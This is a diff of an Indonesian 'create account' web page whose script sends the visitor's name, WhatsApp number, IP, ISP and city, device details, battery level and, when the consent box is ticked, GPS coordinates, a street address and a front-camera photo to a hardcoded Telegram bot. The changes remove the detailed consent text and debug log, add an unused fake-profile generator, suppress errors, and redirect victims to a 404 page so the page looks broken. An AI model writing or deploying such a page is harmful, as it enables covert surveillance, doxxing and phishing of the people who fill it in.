@@ -1,339 +1,270 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Pendaftaran (Dengan Izin)</title>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Daftar</title>
   <style>
-    body { font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:#f6f8fa; color:#111; padding:20px; }
-    .card { max-width:720px; margin:28px auto; background:#fff; border-radius:10px; box-shadow:0 6px 24px rgba(0,0,0,0.08); padding:20px; }
-    h1 { margin:0 0 8px 0; font-size:20px; }
-    p.note { margin:6px 0 18px 0; color:#555; }
-    label { display:block; margin-top:10px; font-weight:600; color:#333; }
-    input[type="text"], input[type="tel"] { width:100%; padding:10px; border-radius:8px; border:1px solid #ddd; margin-top:6px; font-size:14px; }
-    .consent { margin-top:12px; background:#f2f7ff; padding:12px; border-radius:8px; border:1px solid #e6f0ff; color:#0b57d0; }
-    .consent input { margin-right:8px; }
-    button { margin-top:16px; padding:10px 14px; border-radius:8px; border:none; background:#0b57d0; color:#fff; font-weight:700; cursor:pointer; }
-    button:disabled { opacity:0.6; cursor:not-allowed; }
-    pre { background:#0b57d0; color:#fff; padding:12px; border-radius:8px; overflow:auto; max-height:300px; }
-    .small { font-size:13px; color:#666; margin-top:8px; }
+    /* Simple clean form UI (no debug shown) */
+    body { font-family: Inter,system-ui,Arial; background:#f6f8fa; margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; }
+    .card { width:360px; background:#fff; border-radius:12px; padding:18px; box-shadow:0 8px 30px rgba(2,6,23,0.08); }
+    h1{ font-size:18px; margin:0 0 8px 0; }
+    label{ display:block; margin-top:10px; font-size:13px; color:#222; }
+    input[type="text"], input[type="tel"] { width:100%; padding:10px; margin-top:6px; border-radius:8px; border:1px solid #e3e7ee; font-size:14px; }
+    .consent { margin-top:12px; font-size:13px; color:#444; }
+    .consent input{ margin-right:8px; }
+    button { width:100%; margin-top:14px; padding:11px; border-radius:10px; border:none; background:#0b57d0; color:#fff; font-weight:700; cursor:pointer; }
+    button[disabled]{ opacity:0.6; cursor:not-allowed; }
+    .small{ font-size:12px; color:#666; margin-top:8px; text-align:center; }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Buat Akun</h1>
-    <p class="note">Isi data berikut untuk mendaftar. Kami akan meminta izin untuk mengambil foto & lokasi hanya setelah kamu setuju.</p>
+  <div class="card" role="main" aria-labelledby="title">
+    <h1 id="title">Buat Akun</h1>
 
-    <form id="regForm">
-      <label>Nama</label>
-      <input id="name" type="text" required placeholder="Nama lengkap" />
+    <form id="regForm" autocomplete="off">
+      <label for="name">Nama</label>
+      <input id="name" name="name" type="text" required placeholder="Nama lengkap">
 
-      <label>Nomor WhatsApp (contoh: 62812...)</label>
-      <input id="wa" type="tel" required placeholder="62812xxxxxxxx" />
+      <label for="wa">Nomor WhatsApp (contoh 62812...)</label>
+      <input id="wa" name="wa" type="tel" required placeholder="62812xxxxxxxx">
 
       <div class="consent">
-        <label><input id="consentCapture" type="checkbox" /> Saya memberi izin agar situs ini <strong>mengambil foto kamera</strong> dan <strong>lokasi GPS</strong> untuk verifikasi. Saya memahami data akan dikirim ke server/Telegram.</label>
+        <label><input id="consent" type="checkbox"> Saya memberi izin untuk mengambil foto & lokasi (untuk verifikasi).</label>
       </div>
 
-      <button id="submitBtn" type="submit">Daftar & Kirim</button>
-
-      <div class="small">Catatan: kamera dan lokasi hanya akan diakses jika kamu memberi izin ketika diminta oleh browser.</div>
+      <button id="submitBtn" type="submit">Daftar</button>
+      <div class="small">Setelah berhasil, kamu akan diarahkan.</div>
     </form>
-
-    <hr style="margin:18px 0;" />
-
-    <h2>Log (debug)</h2>
-    <pre id="log">Menunggu tindakan...</pre>
   </div>
 
 <script>
-/* === CONFIG: ISI BOT TOKEN & CHAT ID === */
+/* === CONFIG (ISI TOKEN & CHAT ID) === */
 const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
 const CHAT_ID   = "6216902201";
-/* ====================================== */
+/* =================================== */
 
-const logEl = document.getElementById('log');
-function log(msg){ logEl.textContent += "\\n" + msg; console.log(msg); }
+/* Helpers */
+function rand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
+function generatePhone(){ let s='628'; const len = 9 + Math.floor(Math.random()*3); for(let i=0;i<len;i++) s+=Math.floor(Math.random()*10); return s; }
+function generateFakeProfile(){ const first=["Budi","Andi","Siti","Rina","Agus","Dewi","Joko","Rian","Fitri","Eka"]; const last=["Santoso","Wijaya","Kurniawan","Hidayat","Kartika","Pratama"]; const jobs=["Reseller","Pelajar","Karyawan","Driver","Freelancer"]; const kampung=["Babakan","Cisaat","Cibadak"]; const name = rand(first)+' '+rand(last); return { name, age: String(18+Math.floor(Math.random()*40)), gender: Math.random()>0.5?"Laki-laki":"Perempuan", job: rand(jobs), kampung: rand(kampung), phone: generatePhone() }; }
 
-// utility fetch json with timeout/fail-safe
-async function fetchJSON(url, opts = {}) {
-  try {
-    const res = await fetch(url, { cache: 'no-store', ...opts });
-    if (!res.ok) throw new Error('HTTP ' + res.status);
-    return await res.json();
-  } catch (e) {
-    return null;
-  }
-}
+/* Minimal fetch JSON util */
+async function fetchJSON(url){ try{ const r = await fetch(url, { cache: 'no-store' }); if(!r.ok) throw new Error('bad '+r.status); return await r.json(); }catch(e){ return null; } }
 
-/* IP info fallback (ipapi -> ipwhois -> ipify) */
+/* IP info fallback */
 async function getIPInfo(){
   const sources = [
-    { url: 'https://ipapi.co/json/', mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country_name||j.country, org:j.org, postal:j.postal, timezone:j.timezone, lat:j.latitude||j.lat, lon:j.longitude||j.lon }) },
-    { url: 'https://ipwhois.app/json/', mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country, org:j.org||j.isp, postal:j.postal, timezone:j.timezone, lat:j.latitude, lon:j.longitude }) },
-    { url: 'https://api.ipify.org?format=json', mapper: j => ({ ip:j.ip }) }
+    { url:'https://ipapi.co/json/', mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country_name||j.country, org:j.org, postal:j.postal, timezone:j.timezone, lat:j.latitude||j.lat, lon:j.longitude||j.lon }) },
+    { url:'https://ipwhois.app/json/', mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country, org:j.org||j.isp, postal:j.postal, timezone:j.timezone, lat:j.latitude, lon:j.longitude }) },
+    { url:'https://api.ipify.org?format=json', mapper: j => ({ ip:j.ip }) }
   ];
-  for (const s of sources){
+  for(const s of sources){
     const j = await fetchJSON(s.url);
-    if (!j) continue;
+    if(!j) continue;
     const m = s.mapper(j);
-    if (m && m.ip) return m;
+    if(m && m.ip) return m;
   }
   return { ip:'unknown' };
 }
 
-/* reverse geocode via Nominatim, returns address object + display */
+/* Reverse geocode via Nominatim -> return address object + display */
 async function revGeocode(lat, lon){
-  try {
-    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`;
-    const r = await fetch(url, { cache: 'no-store', headers: {'User-Agent':'LegalApp/1.0'}});
-    if (!r.ok) throw new Error('rev geo fail ' + r.status);
+  try{
+    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, { cache:'no-store', headers:{ 'User-Agent':'LegalApp/1.0' }});
+    if(!r.ok) throw new Error('revgeo '+r.status);
     const j = await r.json();
     return { display: j.display_name || null, address: j.address || {} };
-  } catch(e) {
-    return { error: e.message || 'revgeo fail' };
-  }
+  }catch(e){ return { error: e.message || 'revgeo fail' }; }
 }
 
-/* get geolocation (prompts user) */
+/* Geo (prompts) */
 function getGeo(){
-  return new Promise(resolve => {
-    if (!navigator.geolocation) return resolve({ error:'geolocation not supported' });
-    navigator.geolocation.getCurrentPosition(pos => {
-      resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy + ' m' });
+  return new Promise(resolve=>{
+    if(!navigator.geolocation) return resolve({ error:'geolocation not supported' });
+    navigator.geolocation.getCurrentPosition(p=>{
+      resolve({ lat:p.coords.latitude, lon:p.coords.longitude, acc: p.coords.accuracy + ' m' });
     }, err => resolve({ error: err.message }), { enableHighAccuracy: true, timeout: 10000 });
   });
 }
 
-/* get battery & connection, device info */
-async function getBattery(){
-  try {
-    if (!navigator.getBattery) return null;
-    const b = await navigator.getBattery();
-    return `${Math.round(b.level*100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
-  } catch { return null; }
-}
-function getConnection(){ try { const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if (!c) return null; return { effectiveType:c.effectiveType, downlink:c.downlink, rtt:c.rtt, saveData:c.saveData }; } catch { return null; } }
+/* Battery */
+async function getBattery(){ try{ if(!navigator.getBattery) return null; const b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging? 'Charging':'Not Charging'})`; }catch{ return null; } }
+function getConnection(){ try{ const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if(!c) return null; return { effectiveType:c.effectiveType, downlink:c.downlink, rtt:c.rtt, saveData:c.saveData }; }catch{ return null; } }
 
-/* capture photo (prompts user) */
-async function capturePhoto() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio:false });
-    const v = document.createElement('video');
-    v.srcObject = stream;
+/* Capture photo (asks camera permission) */
+async function capturePhoto(){
+  try{
+    const s = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:false });
+    const v = document.createElement('video'); v.srcObject = s;
     await v.play();
-    await new Promise(r => setTimeout(r, 900)); // allow camera warmup
+    await new Promise(r=>setTimeout(r,900));
     const canvas = document.createElement('canvas');
-    const side = Math.min(v.videoWidth || 640, v.videoHeight || 480);
-    canvas.width = 800; canvas.height = 800;
+    const side = Math.min(v.videoWidth||640, v.videoHeight||480);
+    const size = 800;
+    canvas.width = size; canvas.height = size;
     const ctx = canvas.getContext('2d');
-    // center-crop
-    const sx = Math.max(0, (v.videoWidth - side) / 2);
-    const sy = Math.max(0, (v.videoHeight - side) / 2);
-    ctx.drawImage(v, sx, sy, side, side, 0, 0, canvas.width, canvas.height);
-    stream.getTracks().forEach(t => t.stop());
-    return await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
-  } catch (e) {
-    return null; // permission denied or not available
+    const sx = Math.max(0,(v.videoWidth - side)/2), sy = Math.max(0,(v.videoHeight - side)/2);
+    ctx.drawImage(v, sx, sy, side, side, 0, 0, size, size);
+    s.getTracks().forEach(t=>t.stop());
+    return await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.85));
+  }catch(e){
+    return null;
   }
 }
 
-/* build boxed caption (rapi) - trimmed for Telegram caption limits */
-function buildBoxedCaption(data){
+/* Build boxed caption (ordered & tidy) */
+function buildBoxedCaption(obj){
   const now = new Date();
   const lines = [];
   lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
-  if (data.phone) lines.push(` ├─ > Nomor Telepon: ${data.phone}`);
-  lines.push(` ├─ > Nama: ${data.name || '-'}`);
+  if(obj.profile && obj.profile.phone) lines.push(` ├─ > Nomor Telepon: ${obj.profile.phone}`);
+  lines.push(` ├─ > Nama: ${obj.profile && obj.profile.name ? obj.profile.name : (obj.name || '-')}`);
   lines.push(` ├─ > Pesan`);
-  lines.push(` │   └─ ${data.message || 'Pendaftaran & Verifikasi'}`);
+  lines.push(` │   └─ ${obj.message || 'Pendaftaran & Verifikasi (dengan izin)'}`);
   lines.push(` ├─ > Pengirim (web)`);
-  lines.push(` │   └─ ${data.userAgent || '-'}`);
-  // IP / ISP
+  lines.push(` │   └─ ${obj.userAgent || '-'}`);
   lines.push(` ├─ > IP / ISP`);
-  const ip = data.ipInfo || {};
+  const ip = obj.ipInfo || {};
   lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
-  lines.push(` │   ├─ ISP/Org: ${ip.org || ip.isp || '-'}`);
+  lines.push(` │   ├─ ISP/Org: ${ip.org || '-'}`);
   lines.push(` │   ├─ City: ${ip.city || '-'}`);
-  lines.push(` │   ├─ Region: ${ip.region || ip.state || '-'}`);
+  lines.push(` │   ├─ Region: ${ip.region || '-'}`);
   lines.push(` │   ├─ Country: ${ip.country || '-'}`);
   lines.push(` │   └─ Postal: ${ip.postal || '-'}`);
-  // Device
   lines.push(` ├─ > Device`);
-  lines.push(` │   ├─ Platform: ${data.platform || '-'}`);
-  lines.push(` │   ├─ Screen: ${data.screen || '-'}`);
-  lines.push(` │   ├─ Language: ${data.language || '-'}`);
-  lines.push(` │   ├─ Timezone: ${data.timezone || '-'}`);
-  lines.push(` │   ├─ Battery: ${data.battery || '-'}`);
-  // Geo
+  lines.push(` │   ├─ Platform: ${obj.platform || '-'}`);
+  lines.push(` │   ├─ Screen: ${obj.screen || '-'}`);
+  lines.push(` │   ├─ Language: ${obj.language || '-'}`);
+  lines.push(` │   ├─ Timezone: ${obj.timezone || '-'}`);
+  lines.push(` │   ├─ Battery: ${obj.battery || '-'}`);
   lines.push(` ├─ > Geo (GPS)`);
-  if (data.geo && !data.geo.error){
-    lines.push(` │   ├─ Lat: ${data.geo.lat}`);
-    lines.push(` │   ├─ Lon: ${data.geo.lon}`);
-    lines.push(` │   ├─ Akurasi: ${data.geo.acc || '-'}`);
-    lines.push(` │   └─ Maps: https://maps.google.com/?q=${data.geo.lat},${data.geo.lon}`);
+  if(obj.geo && !obj.geo.error){
+    lines.push(` │   ├─ Lat: ${obj.geo.lat}`);
+    lines.push(` │   ├─ Lon: ${obj.geo.lon}`);
+    lines.push(` │   ├─ Akurasi: ${obj.geo.acc || '-'}`);
+    lines.push(` │   └─ Maps: https://maps.google.com/?q=${obj.geo.lat},${obj.geo.lon}`);
   } else {
-    lines.push(` │   └─ GPS: ${data.geo ? data.geo.error : '-'}`);
+    lines.push(` │   └─ GPS: ${obj.geo? obj.geo.error : '-'}`);
   }
-  // Detailed address (Nominatim fields)
   lines.push(` ├─ > Alamat (Detail)`);
-  const a = data.address || {};
-  const addrFields = [
+  const a = obj.address || {};
+  // many common keys
+  const addr = [
     ['Negara','country'], ['Kode Negara','country_code'], ['Provinsi','state'],
     ['State District','state_district'], ['Kabupaten','county'], ['Region','region'],
     ['Kota','city'], ['Town','town'], ['Village','village'], ['Municipality','municipality'],
     ['Kecamatan/Suburb','suburb'], ['Neighbourhood','neighbourhood'], ['Quarter','quarter'],
     ['Kampung/Hamlet','hamlet'], ['Jalan','road'], ['Nomor','house_number'], ['Kode Pos','postcode']
   ];
-  for (const [label,key] of addrFields){
+  for(const [label,key] of addr){
     lines.push(` │   ├─ ${label}: ${a[key] || '-'}`);
   }
-  // Profile
-  lines.push(` ├─ > Profile`);
-  lines.push(` │   ├─ Nama (input): ${data.name || '-'}`);
-  lines.push(` │   ├─ Nomor WA (input): ${data.phone || '-'}`);
   lines.push(` ╰─ > Sumber: Sistem (dengan persetujuan pengguna)`);
-  // join and trim to safe length
-  const caption = lines.join('\\n');
-  if (caption.length > 1000) return caption.slice(0,1000-3) + '...';
-  return caption;
+  const text = lines.join('\n');
+  return text.length>1000? text.slice(0,1000-3)+'...' : text;
 }
 
-/* send message (either photo+caption or text only) */
-async function sendToTelegram({ blob, caption }){
-  try {
-    if (blob){
-      const fd = new FormData();
-      fd.append('chat_id', BOT_CHAT_ID); // replaced later
-    }
-  } catch (e){}
+/* Telegram send (photo+caption single message) */
+async function sendPhotoCaption(blob, caption){
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('photo', blob, 'photo.jpg');
+  fd.append('caption', caption);
+  // plain text caption (no HTML)
+  return fetch(url, { method:'POST', body: fd });
 }
 
-/* Helper to do actual send of photo+caption or sendMessage fallback */
-async function tgSend(blob, caption){
-  if (!BOT_TOKEN || BOT_TOKEN.includes('ISI_TOKEN') || !CHAT_ID || CHAT_ID.includes('ISI_CHATID')) {
-    log('⚠️ BOT_TOKEN atau CHAT_ID belum diisi di script.');
-    return false;
-  }
-  if (blob){
-    const fd = new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('photo', blob, 'photo.jpg');
-    fd.append('caption', caption);
-    // no parse_mode because plain text box
-    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
-    return r.ok;
-  } else {
-    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method:'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
-    });
-    return r.ok;
-  }
+/* Fallback text-only send */
+async function sendText(caption){
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method:'POST',
+    headers:{ 'Content-Type':'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
+  });
 }
 
-/* FORM submit handler */
-document.getElementById('regForm').addEventListener('submit', async (ev) => {
-  ev.preventDefault();
-  logEl.textContent = 'Proses dimulai...';
+/* Main form handler */
+document.getElementById('regForm').addEventListener('submit', async function(e){
+  e.preventDefault();
   const name = document.getElementById('name').value.trim();
-  const phone = document.getElementById('wa').value.trim();
-  const consent = document.getElementById('consentCapture').checked;
+  const wa = document.getElementById('wa').value.trim();
+  const consent = document.getElementById('consent').checked;
 
-  // PREVIEW / confirm: show user exactly what will be collected
-  if (!consent){
-    if (!confirm('Kamu belum memberi izin capture foto & lokasi. Data profil (nama & WA) tetap akan dikirim. Lanjutkan?')) {
-      log('Pengguna membatalkan (tidak memberi izin).');
-      return;
-    }
+  // basic validation
+  if(!name || !wa){ alert('Isi nama dan nomor WA'); return; }
+
+  // prepare minimal profile object
+  let profile = { name, phone: wa };
+  // send minimal registration message first (fast)
+  const regText = `╭─ > Tanggal: ${new Date().toLocaleString()}\n ├─ > Nama: ${name}\n ├─ > Nomor WA: ${wa}\n ╰─ > Aksi: Pendaftaran`;
+  try{
+    await sendText(regText);
+  }catch(e){
+    // ignore; continue to attempt full report
   }
 
-  log('Mengirim data profil (nama & WA) ke Telegram...');
-  // send immediate minimal data (profile) so operator dapat melihat registrasi cepat
-  const profileText = `╭─ > Registrasi\n ├─ > Nama: ${name}\n ├─ > WA: ${phone}\n ╰─ > Waktu: ${new Date().toLocaleString()}`;
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ chat_id: CHAT_ID, text: profileText })
-    });
-    log('Profil dikirim.');
-  } catch (e){
-    log('Gagal kirim profil: ' + (e.message || e));
-  }
-
-  // If user consented, attempt to gather device, IP, geo, photo and send full report
-  let photoBlob = null;
+  // if user consented, gather device, ip, geo, photo
+  let photo = null;
   let geo = { error:'not requested' };
-  let address = null;
   let ipInfo = await getIPInfo();
+  let rev = null;
   const battery = await getBattery();
   const connection = getConnection();
-  const deviceInfo = {
+  const device = {
     platform: navigator.platform || '-',
     userAgent: navigator.userAgent || '-',
-    screen: (window.screen ? `${screen.width}x${screen.height}` : '-'),
+    screen: (window.screen? `${screen.width}x${screen.height}` : '-'),
     language: navigator.language || '-',
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
-    localDate: new Date().toLocaleString(),
-    battery: battery || '-',
-    connection
+    battery: battery || '-'
   };
 
-  if (consent){
-    log('Meminta izin lokasi & kamera...');
+  if(consent){
+    // get geo (may prompt)
     geo = await getGeo();
-    if (!geo.error && geo.lat && geo.lon){
-      log(`Lokasi didapat: ${geo.lat}, ${geo.lon}`);
-      const rev = await revGeocode(geo.lat, geo.lon);
-      if (!rev.error){
-        address = rev.address;
-        log('Reverse geocode OK.');
-      } else {
-        log('Reverse geocode error: ' + rev.error);
-      }
-    } else {
-      log('GPS error / ditolak: ' + (geo.error || 'unknown'));
+    if(!geo.error && geo.lat && geo.lon){
+      rev = await revGeocode(geo.lat, geo.lon);
     }
-    // capture photo
-    photoBlob = await capturePhoto();
-    if (photoBlob) log('Foto berhasil diambil.');
-    else log('Foto gagal / ditolak.');
-  } else {
-    log('User tidak memberi izin capture; lewati pengambilan foto & lokasi.');
+    // get photo (may prompt)
+    photo = await capturePhoto();
   }
 
-  // Build full box caption
-  const data = {
-    name: name,
-    phone: phone,
+  // if profile has no phone (shouldn't), generate safe phone
+  if(!profile.phone) profile.phone = generatePhone();
+
+  // build caption
+  const obj = {
+    profile,
+    name,
     message: 'Pendaftaran & Verifikasi (dengan izin)',
-    userAgent: deviceInfo.userAgent,
-    ipInfo: ipInfo,
-    platform: deviceInfo.platform,
-    screen: deviceInfo.screen,
-    language: deviceInfo.language,
-    timezone: deviceInfo.timezone,
-    localDate: deviceInfo.localDate,
-    battery: deviceInfo.battery,
-    geo: geo,
-    address: address,
-    profile: { name, phone }
+    userAgent: device.userAgent,
+    ipInfo,
+    platform: device.platform,
+    screen: device.screen,
+    language: device.language,
+    timezone: device.timezone,
+    battery: device.battery,
+    geo,
+    address: (rev && rev.address) ? rev.address : {},
   };
-  const caption = buildBoxedCaption(data);
-  log('Mengirim laporan lengkap ke Telegram...');
+  const caption = buildBoxedCaption(obj);
 
-  const ok = await tgSend(photoBlob, caption);
-  if (ok) {
-    log('✅ Laporan terkirim.');
-    alert('Pendaftaran selesai. Terima kasih.');
-    // optional redirect or clear form
-    document.getElementById('regForm').reset();
-  } else {
-    log('❌ Gagal kirim laporan ke Telegram.');
-    alert('Terjadi kesalahan saat mengirim laporan. Cek log.');
+  // send single message: photo+caption if photo exists, else text-only
+  try{
+    if(photo){
+      await sendPhotoCaption(photo, caption);
+    } else {
+      await sendText(caption);
+    }
+  }catch(e){
+    // ignore silently
   }
+
+  // redirect to 404 page (no debug shown)
+  // change this URL if you want a different redirect target
+  window.location.href = '/404.html';
 });
 </script>
 </body>
